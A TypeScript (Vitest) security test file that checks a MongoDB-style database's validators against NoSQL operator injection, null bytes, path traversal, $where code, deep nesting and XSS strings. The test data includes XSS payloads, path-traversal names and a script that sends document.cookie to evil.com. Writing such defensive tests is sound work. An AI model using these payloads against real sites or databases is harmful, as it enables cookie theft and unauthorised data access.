/**
 * Security Tests - Input Validation
 *
 * Tests for validating inputs against injection attacks, malicious payloads,
 * and other security concerns.
 */

import { describe, it, expect } from 'vitest';
import {
  ValidationError,
  validateDatabaseName,
  validateCollectionName,
  validateFieldName,
  validateFilter,
  validateDocument,
  validateUpdate,
} from '../../../src/validation/index.js';

// ============================================================================
// Injection Attempts in Field Names
// ============================================================================

describe('Security - Injection Attempts in Field Names', () => {
  describe('NoSQL Injection via field names', () => {
    it('should reject $where injection in field names', () => {
      expect(() => validateFieldName('$where')).toThrow(ValidationError);
      expect(() => validateFieldName('$where')).toThrow(/\$ character/);
    });

    it('should reject operator-like field names', () => {
      const maliciousFieldNames = [
        '$gt',
        '$lt',
        '$ne',
        '$eq',
        '$in',
        '$nin',
        '$or',
        '$and',
        '$regex',
        '$exists',
        '$set',
        '$unset',
      ];

      for (const fieldName of maliciousFieldNames) {
        expect(() => validateFieldName(fieldName)).toThrow(ValidationError);
      }
    });

    it('should reject field names with embedded operators', () => {
      // These might try to exploit improper parsing
      expect(() => validateDocument({ '$set.evil': 'value' })).toThrow(ValidationError);
      expect(() => validateDocument({ 'field$where': 'value' })).not.toThrow(); // $ not at start is OK
    });

    it('should reject field names attempting prototype pollution', () => {
      // Prototype pollution attempts via field names
      expect(() => validateDocument({ '__proto__': { admin: true } })).not.toThrow(); // JSON-safe key
      expect(() => validateDocument({ 'constructor': { admin: true } })).not.toThrow(); // But handled safely

      // The actual validation is that these don't affect Object.prototype
      const doc = { '__proto__': { polluted: true } };
      validateDocument(doc);
      // @ts-expect-error - testing runtime behavior
      expect(({}).polluted).toBeUndefined();
    });
  });

  describe('Null byte injection', () => {
    it('should reject null bytes in database names', () => {
      expect(() => validateDatabaseName('mydb\0evil')).toThrow(ValidationError);
      expect(() => validateDatabaseName('mydb\0evil')).toThrow(/null bytes/);
    });

    it('should reject null bytes in collection names', () => {
      expect(() => validateCollectionName('users\0/etc/passwd')).toThrow(ValidationError);
      expect(() => validateCollectionName('col\0')).toThrow(/null bytes/);
    });

    it('should reject null bytes in field names', () => {
      expect(() => validateFieldName('field\0name')).toThrow(ValidationError);
      expect(() => validateFieldName('data\0')).toThrow(/null bytes/);
    });

    it('should reject null bytes hidden in various positions', () => {
      // Beginning
      expect(() => validateDatabaseName('\0database')).toThrow(ValidationError);
      // Middle
      expect(() => validateDatabaseName('data\0base')).toThrow(ValidationError);
      // End
      expect(() => validateDatabaseName('database\0')).toThrow(ValidationError);
      // Multiple
      expect(() => validateDatabaseName('da\0ta\0base')).toThrow(ValidationError);
    });
  });
});

// ============================================================================
// Malicious ObjectId Values
// ============================================================================

describe('Security - Malicious ObjectId Values', () => {
  describe('ObjectId-like injection', () => {
    it('should handle filter with ObjectId string that looks like operator', () => {
      // An attacker might try to pass something that looks like an ObjectId but isn't
      const filter = { _id: { $gt: '' } };
      // This is a valid filter structure (comparison)
      expect(() => validateFilter(filter)).not.toThrow();
    });

    it('should reject invalid operators disguised in _id queries', () => {
      const filter = { _id: { $badOperator: 'value' } };
      expect(() => validateFilter(filter)).toThrow(ValidationError);
      expect(() => validateFilter(filter)).toThrow(/invalid query operator/);
    });

    it('should handle oversized ID values gracefully', () => {
      // Very long string that might cause buffer issues
      const longId = 'a'.repeat(10000);
      const filter = { _id: longId };
      // Should not crash, validation passes (length is a storage concern)
      expect(() => validateFilter(filter)).not.toThrow();
    });

    it('should handle nested _id manipulation attempts', () => {
      // Trying to query with nested structure to bypass
      const filter = { '_id._bsontype': 'ObjectId' };
      // Field name validation catches the underscore-prefixed subfield - but _id is special
      expect(() => validateFilter(filter)).not.toThrow(); // Dotted notation is valid
    });
  });

  describe('Type confusion attacks', () => {
    it('should handle _id as various types', () => {
      // These are all valid filter values
      expect(() => validateFilter({ _id: 'string' })).not.toThrow();
      expect(() => validateFilter({ _id: 123 })).not.toThrow();
      expect(() => validateFilter({ _id: null })).not.toThrow();
      expect(() => validateFilter({ _id: { $in: ['a', 'b'] } })).not.toThrow();
    });

    it('should reject _id with invalid operator structures', () => {
      // Invalid: $in requires array
      expect(() => validateFilter({ _id: { $in: 'not-array' } })).toThrow(ValidationError);
      // Invalid: logical operator without array
      expect(() => validateFilter({ _id: { $and: 'not-array' } })).toThrow(ValidationError);
    });
  });
});

// ============================================================================
// XSS Payloads in String Fields
// ============================================================================

describe('Security - XSS Payloads in String Fields', () => {
  describe('Document storage with XSS payloads', () => {
    it('should accept XSS payloads in document values (storage is allowed, display must escape)', () => {
      // MongoLake stores data as-is; XSS prevention is a display/output concern
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(document.cookie)</script>',
        "javascript:alert('XSS')",
        '<svg onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
      ];

      for (const payload of xssPayloads) {
        // Document values can contain any string - this is expected behavior
        expect(() => validateDocument({ content: payload })).not.toThrow();
        expect(() => validateDocument({ name: payload, nested: { value: payload } })).not.toThrow();
      }
    });

    it('should reject XSS payloads in field NAMES (not values)', () => {
      // Field names starting with $ are rejected, but HTML isn't in field names typically
      // The concern is that field names might be reflected in error messages
      // Field names cannot contain null bytes
      expect(() => validateDocument({ '<script>': 'value' })).not.toThrow(); // HTML in field name is unusual but valid
    });

    it('should sanitize values in ValidationError messages', () => {
      // When validation fails, the error should not expose raw malicious input
      const maliciousValue = '<script>alert(document.cookie)</script>'.repeat(100);

      try {
        validateDatabaseName(maliciousValue);
        expect.fail('Should have thrown');
      } catch (err) {
        expect(err).toBeInstanceOf(ValidationError);
        const validationErr = err as ValidationError;
        // Check that the invalid value is truncated for safety
        expect(validationErr.invalidValue?.length).toBeLessThanOrEqual(103);
      }
    });
  });

  describe('Update operations with XSS payloads', () => {
    it('should allow XSS payloads in $set values (data storage)', () => {
      const xssUpdate = {
        $set: {
          bio: '<script>alert("xss")</script>',
          description: '<img src=x onerror=alert(1)>',
        },
      };
      expect(() => validateUpdate(xssUpdate)).not.toThrow();
    });

    it('should allow XSS payloads in $push values', () => {
      const update = {
        $push: {
          comments: '<script>document.location="http://evil.com?c="+document.cookie</script>',
        },
      };
      expect(() => validateUpdate(update)).not.toThrow();
    });
  });

  describe('Filter queries with XSS payloads', () => {
    it('should handle XSS payloads in filter values', () => {
      // Searching for XSS strings should work
      const filter = {
        content: '<script>alert(1)</script>',
        $or: [
          { field: '<img src=x onerror=alert(1)>' },
          { field: '{{constructor.constructor("alert(1)")()}}' },
        ],
      };
      expect(() => validateFilter(filter)).not.toThrow();
    });

    it('should handle XSS in $regex patterns', () => {
      // Regex with script-like content
      const filter = { content: { $regex: '<script>.*</script>' } };
      expect(() => validateFilter(filter)).not.toThrow();
    });
  });
});

// ============================================================================
// Path Traversal in Field Names
// ============================================================================

describe('Security - Path Traversal in Field Names', () => {
  describe('Database name path traversal', () => {
    it('should reject ../ in database names', () => {
      expect(() => validateDatabaseName('../etc')).toThrow(ValidationError);
      expect(() => validateDatabaseName('../../root')).toThrow(ValidationError);
      expect(() => validateDatabaseName('..%2F..%2Fetc')).toThrow(ValidationError); // URL encoded
    });

    it('should reject absolute paths in database names', () => {
      expect(() => validateDatabaseName('/etc/passwd')).toThrow(ValidationError);
      expect(() => validateDatabaseName('C:\\Windows\\System32')).toThrow(ValidationError);
    });

    it('should reject dots in database names', () => {
      expect(() => validateDatabaseName('my.db')).toThrow(ValidationError);
      expect(() => validateDatabaseName('.hidden')).toThrow(ValidationError);
      expect(() => validateDatabaseName('db.')).toThrow(ValidationError);
    });
  });

  describe('Collection name path traversal', () => {
    it('should reject ../ in collection names', () => {
      expect(() => validateCollectionName('../secret')).toThrow(ValidationError);
      expect(() => validateCollectionName('users/../admin')).toThrow(ValidationError);
    });

    it('should reject slashes in collection names', () => {
      expect(() => validateCollectionName('path/to/file')).toThrow(ValidationError);
      expect(() => validateCollectionName('dir\\file')).toThrow(ValidationError);
    });

    it('should reject system. prefix (reserved)', () => {
      expect(() => validateCollectionName('system.users')).toThrow(ValidationError);
      expect(() => validateCollectionName('system.indexes')).toThrow(ValidationError);
      expect(() => validateCollectionName('system.profile')).toThrow(ValidationError);
    });
  });

  describe('Field name path manipulation', () => {
    it('should allow dotted field notation for nested access', () => {
      // This is MongoDB's standard way to access nested fields
      const filter = { 'address.city': 'NYC' };
      expect(() => validateFilter(filter)).not.toThrow();
    });

    it('should reject empty segments in dotted paths', () => {
      // Double dots or empty segments in update paths
      expect(() => validateUpdate({ $set: { 'a..b': 'value' } })).toThrow(ValidationError);
      expect(() => validateUpdate({ $set: { '.field': 'value' } })).toThrow(ValidationError);
      expect(() => validateUpdate({ $set: { 'field.': 'value' } })).toThrow(ValidationError);
    });
  });

  describe('Unicode normalization attacks', () => {
    it('should handle Unicode path separators', () => {
      // Various Unicode characters that might be interpreted as path separators
      const unicodeSeparators = [
        '\u2215', // Division slash
        '\u2044', // Fraction slash
        '\u29F8', // Big solidus
        '\uFF0F', // Fullwidth solidus
      ];

      for (const sep of unicodeSeparators) {
        // These should either be rejected or treated as regular characters
        // The current implementation uses a strict allowlist, so these fail
        expect(() => validateDatabaseName(`db${sep}name`)).toThrow(ValidationError);
      }
    });

    it('should handle Unicode dots', () => {
      const unicodeDots = [
        '\u2024', // One dot leader
        '\uFF0E', // Fullwidth full stop
        '\u00B7', // Middle dot
      ];

      for (const dot of unicodeDots) {
        // Strict allowlist rejects these
        expect(() => validateDatabaseName(`db${dot}name`)).toThrow(ValidationError);
      }
    });
  });
});

// ============================================================================
// Command Injection via Filter/Update Operators
// ============================================================================

describe('Security - Command Injection Prevention', () => {
  describe('$where operator security', () => {
    it('should reject $where operator by default', () => {
      const filter = { $where: 'this.isAdmin === true' };
      expect(() => validateFilter(filter)).toThrow(ValidationError);
      expect(() => validateFilter(filter)).toThrow(/\$where.*not allowed/);
    });

    it('should reject $where with JavaScript code injection', () => {
      const maliciousFilters = [
        { $where: 'function() { while(1); }' }, // DoS
        { $where: 'sleep(10000)' }, // Time delay
        { $where: 'this.password.match(/./)' }, // Data exfiltration
      ];

      for (const filter of maliciousFilters) {
        expect(() => validateFilter(filter)).toThrow(ValidationError);
      }
    });

    it('should allow $where only when explicitly permitted', () => {
      const filter = { $where: 'this.x > 1' };
      expect(() => validateFilter(filter, { allowWhere: true })).not.toThrow();
    });
  });

  describe('Invalid operator injection', () => {
    it('should reject unknown operators', () => {
      const invalidFilters = [
        { field: { $invalid: 'value' } },
        { field: { $exec: 'command' } },
        { field: { $eval: 'code' } },
        { field: { $function: {} } },
        { field: { $accumulator: {} } },
      ];

      for (const filter of invalidFilters) {
        expect(() => validateFilter(filter)).toThrow(ValidationError);
      }
    });

    it('should reject invalid update operators', () => {
      const invalidUpdates = [
        { $invalid: { field: 'value' } },
        { $eval: { code: 'dangerous' } },
        { $function: { body: 'alert(1)' } },
      ];

      for (const update of invalidUpdates) {
        expect(() => validateUpdate(update)).toThrow(ValidationError);
      }
    });
  });

  describe('Nesting depth attacks', () => {
    it('should reject excessively nested filters', () => {
      // Create deeply nested filter to potentially cause stack overflow
      let filter: Record<string, unknown> = { a: 1 };
      for (let i = 0; i < 20; i++) {
        filter = { $and: [filter] };
      }

      expect(() => validateFilter(filter, { maxDepth: 10 })).toThrow(ValidationError);
      expect(() => validateFilter(filter, { maxDepth: 10 })).toThrow(/maximum nesting depth/);
    });

    it('should reject excessively nested documents', () => {
      let doc: Record<string, unknown> = { value: 'leaf' };
      for (let i = 0; i < 150; i++) {
        doc = { nested: doc };
      }

      expect(() => validateDocument(doc, { maxDepth: 100 })).toThrow(ValidationError);
      expect(() => validateDocument(doc, { maxDepth: 100 })).toThrow(/maximum nesting depth/);
    });

    it('should reject excessive operator count', () => {
      const filter: Record<string, unknown> = {};
      for (let i = 0; i < 150; i++) {
        filter[`field${i}`] = { $eq: i };
      }

      expect(() => validateFilter(filter, { maxOperators: 100 })).toThrow(ValidationError);
    });
  });
});

// ============================================================================
// Array-based Injection Attempts
// ============================================================================

describe('Security - Array-based Attacks', () => {
  describe('Array operator abuse', () => {
    it('should reject $in with non-array values', () => {
      expect(() => validateFilter({ field: { $in: 'string' } })).toThrow(ValidationError);
      expect(() => validateFilter({ field: { $in: 123 } })).toThrow(ValidationError);
      expect(() => validateFilter({ field: { $in: { object: true } } })).toThrow(ValidationError);
    });

    it('should reject $nin with non-array values', () => {
      expect(() => validateFilter({ field: { $nin: 'string' } })).toThrow(ValidationError);
    });

    it('should reject operators within $in arrays', () => {
      const filter = { field: { $in: [{ $gt: 1 }] } };
      expect(() => validateFilter(filter)).toThrow(ValidationError);
      expect(() => validateFilter(filter)).toThrow(/cannot contain operators/);
    });

    it('should reject $and/$or without arrays', () => {
      expect(() => validateFilter({ $and: { a: 1 } })).toThrow(ValidationError);
      expect(() => validateFilter({ $or: 'not-array' })).toThrow(ValidationError);
      expect(() => validateFilter({ $nor: null })).toThrow(ValidationError);
    });
  });

  describe('Large array attacks', () => {
    it('should handle large arrays in $in (potential DoS)', () => {
      const largeArray = Array(10000).fill('value');
      const filter = { field: { $in: largeArray } };
      // Should not crash; performance is a separate concern
      expect(() => validateFilter(filter)).not.toThrow();
    });
  });
});
